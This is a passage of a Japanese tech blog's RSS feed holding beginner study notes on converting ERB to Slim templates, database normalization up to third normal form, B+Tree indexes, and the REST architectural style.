&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/css">css&lt;/a>は.続けて記述することでマージが可能。&lt;/h5>
&lt;pre class="code lang-html" data-lang="html" data-unlink> &amp;lt;div class="container body-content"&amp;gt;
&lt;/pre>
&lt;p>という&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/css">css&lt;/a>の指定があった場合&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> .container.body-content
&lt;/pre>
&lt;p>とピリオドをつなげることで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/css">css&lt;/a>のマージができます。&lt;/p>
&lt;h5>自動変換でうまく対応してくれない所&lt;/h5>
&lt;p>これは自動変換だとどうなんだろうと思った所なのですが&lt;/p>
&lt;pre class="code lang-html" data-lang="html" data-unlink> &amp;lt;div id="&amp;lt;%= "user_icon#{user.id}" %&amp;gt;"
&lt;/pre>
&lt;p>このerbのコードが自動変換だと&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> | &amp;lt;div id="
= "user_icon#{user.id}"
| " &amp;gt; &lt;/pre>
&lt;p>とずいぶんと汚く変換されるのですが
slimは= の後に直接 &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a> コードを書けますので&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> id="user_icon#{user.id}" &lt;/pre>
&lt;p>と書けます。&lt;/p>
&lt;p>また、iframeなんかも自動変換だとうまく変換してくれないので自分でなおしました。&lt;/p>
&lt;pre class="code lang-html" data-lang="html" data-unlink> &amp;lt;iframe class="hatenablogcard"
&lt;/pre>
&lt;p>がそのままの表記でslimファイルとして残されてしまうので、手動で&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> iframe class="hatenablogcard" &lt;/pre>
&lt;p>とする必要がありました。&lt;/p>
&lt;h3>今年のまとめ&lt;/h3>
&lt;p>今年は転職でなかなか精神MP使って大変でした。勉強会、スクール、日々のゲーム友達等々、関わってくださった方には本当に感謝しています。
来年はエンジニアとして働き始める予定です。このブログで技術書の読書録を継続して行きたいですね。&lt;/p>
&lt;/body></description></item><item><title>正規化理論 （第三正規形まで）</title><link>https://qwyng.dev/posts/2018/12/23/182547/</link><pubDate>Sun, 23 Dec 2018 18:25:00 +0900</pubDate><guid>https://qwyng.dev/posts/2018/12/23/182547/</guid><description>&lt;body>&lt;div class="section">
&lt;h4>正規化理論とは&lt;/h4>
&lt;p>データベース技術 [実践] 入門を読んで第二弾&lt;br>
データベース設計で行うべき手順&lt;br>
第１正規形から第５正規形まであります。&lt;br>
基本的には第三正規形までやれば十分といわれているらしいです。&lt;/p>
&lt;p> &lt;/p>
&lt;div class="section">
&lt;h5>第一正規形&lt;/h5>
&lt;p>テーブル構成において重複や繰り返し、複合値（一つのカラムに複数の情報をもたせること）を含んだ構造にしないこと。&lt;/p>
&lt;p>重複があると一部書き間違えてしてしまっても検知できず、同じ部署に所属している人同士で部署の連絡先が違うといった事態になってしまいます。&lt;/p>
&lt;p>この正規化を行うにはテーブルを複数つくって関連付けを行い重複を避けるという方法が本書には書かれています。&lt;/p>
&lt;p> &lt;/p>
&lt;/div>
&lt;div class="section">
&lt;h5>第二正規化&lt;/h5>
&lt;p>主キーが複数のカラムから構成されていて、そのうちの一部のカラムの値によってのみきまる列があるテーブルを第二正規化が行われていないテーブルと呼ぶ&lt;/p>
&lt;table>
&lt;tr>
&lt;th>order_id&lt;/th>
&lt;th>user_id&lt;/th>
&lt;th>user_name&lt;/th>
&lt;th>created&lt;/th>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>201&lt;/td>
&lt;td>花村陽介&lt;/td>
&lt;td>2018-12-23&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>202&lt;/td>
&lt;td>天城雪子&lt;/td>
&lt;td>2018-12-24&lt;/td>
&lt;/tr>
&lt;/table>
&lt;p>order_idとuser_idでcreatedカラムは決まるがuser_nameカラムはuser_idだけで決まるので、このテーブルは第二正規化が行われていないテーブルと言えます。なぜこういったテーブルが問題なのかというと、同じuser_idを持ちながら違うuser_nameを登録することもできてしまうからでです。&lt;/p>
&lt;/div>
&lt;div class="section">
&lt;h5>第三正規形&lt;/h5>
&lt;p>テーブルのすべてのカラムは列は主キーによってただ一つに決まるべきである、というもの。&lt;br>
例えば&lt;/p>
&lt;table>
&lt;tr>
&lt;th>user_id&lt;/th>
&lt;th>user_name&lt;/th>
&lt;th>school&lt;/th>
&lt;th>school_place&lt;/th>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>花村陽介&lt;/td>
&lt;td> 八十神高等学校 &lt;/td>
&lt;td>八十稲羽市&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td> 伊織 順平 &lt;/td>
&lt;td> 月光館学園 &lt;/td>
&lt;td>巌戸台&lt;/td>
&lt;/tr>
&lt;/table>
&lt;p>このテーブルではuser_idでuser_nameは決まるが、school_placeはuser_idと直接関係がありません。この構造の問題点は同じschoolであるにもかかわらず、異なるschool_placeが登録できてしまう点です。&lt;/p>
&lt;p>まとめ&lt;br>
第一正規形　ｰ&amp;gt;　重複がないようにしましょう。&lt;br>
第二正規形　ｰ&amp;gt;　複数の主キーがある場合には一部のキーだけで値が決まるようなカラムは持たせないようにしましょう。&lt;br>
第三正規形　ｰ&amp;gt;　主キーで直接値が決まらないカラムはそのテーブルが持つべきではありません。&lt;/p>
&lt;/div>
&lt;div class="section">
&lt;h5>データベース技術実践入門以外で参考になったもの&lt;/h5>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=http%3A%2F%2Fwww.atmarkit.co.jp%2Fait%2Farticles%2F1109%2F07%2Fnews124.html" title="【DB概論】正規化の手順 (1/2)" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="http://www.atmarkit.co.jp/ait/articles/1109/07/news124.html">www.atmarkit.co.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;br>
&lt;p> &lt;/p>
&lt;p> &lt;/p>
&lt;/div>
&lt;/div>&lt;/body></description></item><item><title>B+Treeインデックス　（webエンジニアのためのデータベース技術[実践]入門）</title><link>https://qwyng.dev/posts/2018/12/20/230622/</link><pubDate>Thu, 20 Dec 2018 23:06:00 +0900</pubDate><guid>https://qwyng.dev/posts/2018/12/20/230622/</guid><description>&lt;body>
&lt;h4>はじめに&lt;/h4>
&lt;p>webエンジニアのためのデータベース技術[実践]入門を読み進めているのですが、なかなか腹に落ちる感じがないので少量ずつ文字にして理解を勧めていきたい&lt;/p>
&lt;h4> &lt;/h4>
&lt;h4>B+Treeインデックス&lt;/h4>
&lt;p>ルートブロック、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D6%A5%E9%A5%F3%A5%C1%A5%D6%A5%ED%A5%C3%A5%AF">ブランチブロック&lt;/a>、リーフブロックという木のような構造をもっているデータベースのインデックス構造の一つ。リーフブロックに実際のデータの格納位置の情報があり、ルート、ブランチにはそれぞれ下のブロックの検索のキーに対して対象のブロックはどこにあるのかという情報のみある。&lt;/p>
&lt;p>ハッシュインデックスの進化版？&lt;/p>
&lt;figure class="figure-image figure-image-fotolife mceNonEditable" title="https://commons.wikimedia.org/wiki/File:Btree.svg#/media/File:Btree.svg">
&lt;p>&lt;img class="hatena-fotolife" title="f:id:sasa5740:20181206211518p:plain" src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20181206/20181206211518.png" alt="f:id:sasa5740:20181206211518p:plain">&lt;/p>
&lt;figcaption>&lt;a href="https://commons.wikimedia.org/wiki/File:Btree.svg#/media/File:Btree.svg">https://commons.wikimedia.org/wiki/File:Btree.svg#/media/File:Btree.svg&lt;/a>&lt;/figcaption>
&lt;/figure>
&lt;p>                                                   出典 &lt;a href="https://ja.wikipedia.org/wiki/B%2B%E6%9C%A8">B+木 - Wikipedia&lt;/a>&lt;/p>
&lt;p>この図はルートとブランチが兼ねているが、d1を検索するにはまずルートブロックの3以下を選びリーフブロックから1をみつけだして(scanして)d1の場所を見つけるという流れになる。&lt;/p>
&lt;p>分岐を多く作れるので枝分かれを2つしか作れない二本&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%DA%B9%BD%C2%A4">木構造&lt;/a>より階層を浅くでき、アクセス回数を減らすことができる。&lt;/p>
&lt;p> &lt;/p>
&lt;h4>B+TreeとB-Tree&lt;/h4>
&lt;p>B-Treeというインデックス構造もあり、これは途中のブランチにも値を持つことがあるデータ構造です。リーフまでアクセスしなくても値を見つけることが利点ですが、このB-Treeと比較してB+Treeは範囲検索する時に大きなメリットを持ちます。&lt;/p>
&lt;p>上の図を見ればわかりますがB+Treeでは目的の値がそのリーフだけではすべて見つからない時には隣のリーフへジャンプして値を探しに行っています。リーフにしか値はないので途中で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D6%A5%E9%A5%F3%A5%C1%A5%D6%A5%ED%A5%C3%A5%AF">ブランチブロック&lt;/a>に戻ったりする必要はありません。B-Treeはブランチにも値があるかもしれないのでブランチやリーフを行ったり来たりして値の存在確認をしなくてはならない&lt;/p>
&lt;p> &lt;/p>
&lt;h4>B+Treeインデックスのメリット&lt;/h4>
&lt;p>二本木（２又にのみ別れていく木の構造）よりも階層を浅くでき、さらにブランチにデータの格納場所を持たないため一度リーフにたどり着けば範囲検索でも隣のリーフのみ探せば良いので高速。&lt;/p>
&lt;p>インデックスの”&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%D5%A5%A1%A5%AF%A5%C8">デファクト&lt;/a>”とのこと。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%D5%A5%A1%A5%AF%A5%C8%A5%B9%A5%BF%A5%F3%A5%C0%A1%BC%A5%C9">デファクトスタンダード&lt;/a>ってことかな？&lt;/p>
&lt;p> &lt;/p>
&lt;/body></description></item><item><title>RESTとはなにか　webを支える技術を読んで</title><link>https://qwyng.dev/posts/2018/12/04/235710/</link><pubDate>Tue, 04 Dec 2018 23:57:00 +0900</pubDate><guid>https://qwyng.dev/posts/2018/12/04/235710/</guid><description>&lt;body>
&lt;h4 id="はじめに">はじめに&lt;/h4>
&lt;p>エンジニアとして働くための予習としておすすめされた技術書を業務のあとに読んでいるのですが、なにかしらアウトプットしないと身につかないなぁという思いがありブログをしたためました。本のまとめ的な内容なのでQiitaにあげるのも違うよなぁと思った次第です。&lt;/p>
&lt;p>今回は山本陽&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CA%BF%BB%E1">平氏&lt;/a>著のWebを支える技術の中で解説されているRESTについてです。&lt;/p>
&lt;p>こちらも参考にしました&lt;/p>
&lt;p>&lt;a href="https://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm#sec_5_1">Fielding Dissertation: CHAPTER 5: Representational State Transfer (REST)&lt;/a>&lt;/p>
&lt;p> &lt;/p>
&lt;h3 id="RESTとは">RESTとは&lt;/h3>
&lt;p>REST (&lt;span style="box-sizing: inherit; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; color: #000000;">RE&lt;/span>&lt;span style="color: #333333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; float: none; display: inline !important;">presentational &lt;/span>&lt;span style="box-sizing: inherit; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; color: #000000;">S&lt;/span>&lt;span style="color: #333333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; float: none; display: inline !important;">&lt;span style="color: #000000;">t&lt;/span>ate &lt;/span>&lt;span style="box-sizing: inherit; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; color: #000000;">T&lt;/span>&lt;span style="color: #333333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; float: none; display: inline !important;">ransfer) &lt;/span>とは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル（システムの構造での共通した思想、構造）の一つ&lt;/p>
&lt;p>RESTは次の6つの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイルを組み合わせた複合&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル&lt;/p>
&lt;ul class="table-of-contents">
&lt;li>&lt;a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB">はじめに&lt;/a>&lt;/li>
&lt;li>
&lt;a href="#REST%E3%81%A8%E3%81%AF">RESTとは&lt;/a>&lt;ul>
&lt;li>&lt;a href="#%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC">クライアント/サーバー&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%82%B9%E3%83%86%E3%83%BC%E3%83%88%E3%83%AC%E3%82%B9%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC">ステートレスサーバー&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5">キャッシュ&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E7%B5%B1%E4%B8%80%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%BC%E3%83%95%E3%82%A7%E3%83%BC%E3%82%B9">統一インターフェース&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E9%9A%8E%E5%B1%A4%E5%8C%96%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0">階層化システム&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%82%B3%E3%83%BC%E3%83%89%E3%82%AA%E3%83%B3%E3%83%87%E3%83%9E%E3%83%B3%E3%83%89">コードオンデマンド&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#Web%E3%81%AE%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%82%92REST%E3%81%AB%E3%81%99%E3%82%8B%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88">WebのアーキテクチャスタイルをRESTにするメリット&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ&lt;/a>&lt;/li>
&lt;/ul>
&lt;p> &lt;/p>
&lt;h4 id="クライアントサーバー">クライアント/サーバー&lt;/h4>
&lt;p>クライアント/サーバーとはクライアントからサーバーにリク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トを送り、サーバーはそれに対してレスポンスを返すという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。サーバーとクライアントがそれぞれ独立しているので、クライアントを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%C1%A5%D7%A5%E9%A5%C3%A5%C8%A5%D5%A5%A9%A1%BC%A5%E0">マルチプラットフォーム&lt;/a>にできたり、逆にサーバーを増やして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BE%E9%C4%B9%B2%BD">冗長化&lt;/a>し、一つサーバーに問題があっても別のサーバーを使えるようすることができる。&lt;/p>
&lt;p> &lt;/p>
&lt;h4 id="ステートレスサーバー">ステートレスサーバー&lt;/h4>
&lt;p>サーバーがクライアントの要求をいちいち覚えていないようにする&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。&lt;/p>
&lt;p>いちいち覚えるのはクライアントが少なければ便利だが、実際は数多くのクライアント相手にしなければならないので、サーバーへの負担は大きくなってしまう。サーバーを増設してもクライアント情報の同期がという問題が発生するので、規模を大きくしにくいという問題もある。&lt;/p>
&lt;p>そこでステートレスサーバーとしてクライアント側がそれぞれ要求を自分で保持していれば、サーバーはクライアントの情報を共有する必要がなくなるので、クライアントが多くなってもサーバーを増設することで対応できるようになり、規模を大きくしやすくなる。&lt;/p>
&lt;p>Webを支える技術内での&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%CF%A5%F3%A5%D0%A1%BC%A5%AC">ハンバーガ&lt;/a>ー屋さんの例がとってもわかりやすいので、気になる人はWebを支える技術買いましょう。&lt;/p>
&lt;h4 id="キャッシュ">キャッシュ&lt;/h4>
&lt;p>サーバーから取得したリソースをクライアント側で保持して使い回す&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。使い回せると通信量が減ってパフォーマンスアップ。&lt;/p>
&lt;p>HTTPの機能としてのキャッシュでは有効期限を決めたり（相対的な決め方もできる、現在から何時間とか）、条件付きでクライアントに使わせたりできます。&lt;/p>
&lt;p> &lt;/p>
&lt;h4 id="統一インターフェース">統一インターフェース&lt;/h4>
&lt;p>リソースへの操作を制限してみんな同じインターフェースで扱うようにしましょうという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。&lt;/p>
&lt;p>例えば&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%DF%A5%B3%A5%F3">ファミコン&lt;/a>はいろいろゲームがあるけど操作するのは基本的に同じ形状のコントローラー。ゲームはコントローラーからの入力にのみ対応できるようにすれば良い。これが人によってコントローラーの形状やボタンが全くちがう状態になってしまうと開発者側はゲームをあらゆる入力に答えるよう作らなくてはいけなくなってしまう。&lt;/p>
&lt;p>この状態だとゲームは複雑になってしまうばかりか、コントローラーのことを常に考えたものになってしまい、独立性も失ってしまう。&lt;/p>
&lt;p>HTTP1.1ではGETやPOSTなどの8個のメソッドという共通のコントローラーに限定することで、リソースへの操作は統一されシンプルかつ、サーバーとクライアントの独立性を高めている。&lt;/p>
&lt;h4 id="階層化システム">階層化システム&lt;/h4>
&lt;p>システムをいくつかの階層に分離する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。これはシステムを大きくすることへの制約であり、古いシステムを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AB%A5%D7%A5%BB%A5%EB%B2%BD">カプセル化&lt;/a>してシステム全体への影響を最小限にするといった、システムそれぞれの独立性を高めるような構造をつくることができる。&lt;/p>
&lt;h4 id="コードオンデマンド">コードオンデマンド&lt;/h4>
&lt;p>プログラムをクライアントにダウンロードして実行する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JavaScript">JavaScript&lt;/a>や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Flash">Flash&lt;/a>等がこれに当てはまる。クライアントの簡素化、拡張性の向上がみこめる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイル。欠点として通信で何をしているのかがわかりにくくなってしまうのであくまでオプションとしての制約。&lt;/p>
&lt;p> &lt;/p>
&lt;h3 id="WebのアーキテクチャスタイルをRESTにするメリット">Webの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>スタイルをRESTにするメリット&lt;/h3>
&lt;p>インターフェースが統一されているので互換性が保たれ、ブラウザをを統一したりしないですむ。クライアントとサーバーを分けていて、かつステートレスなので、規模を大きくすることもやりやすい。&lt;/p>
&lt;p> &lt;/p>
&lt;h3 id="まとめ">まとめ&lt;/h3>
&lt;p>RESTというとリソースに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CRUD">CRUD&lt;/a>で正しい&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/URI">URI&lt;/a>になるようにする、という程度の認識しかなかったので勉強になりました&lt;/p>
&lt;p>自分がつくるサービスもRESTという理想になるべく近づけたものを作っていきたいなぁとおもいました（感想）&lt;/p>
&lt;p> &lt;/p>
&lt;p> &lt;/p>
&lt;/body></description></item></channel></rss>